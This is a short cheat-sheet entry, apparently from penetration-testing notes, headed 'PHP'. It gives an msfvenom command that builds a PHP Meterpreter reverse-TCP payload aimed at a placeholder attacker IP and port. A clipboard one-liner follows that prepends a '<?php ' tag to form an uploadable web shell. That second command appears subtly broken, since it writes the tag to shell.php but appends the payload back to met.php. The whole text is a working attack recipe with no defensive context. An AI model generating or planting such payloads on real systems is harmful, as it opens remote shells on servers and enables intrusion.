# PHP

`$ msfvenom -p php/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o met.php`

`$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php`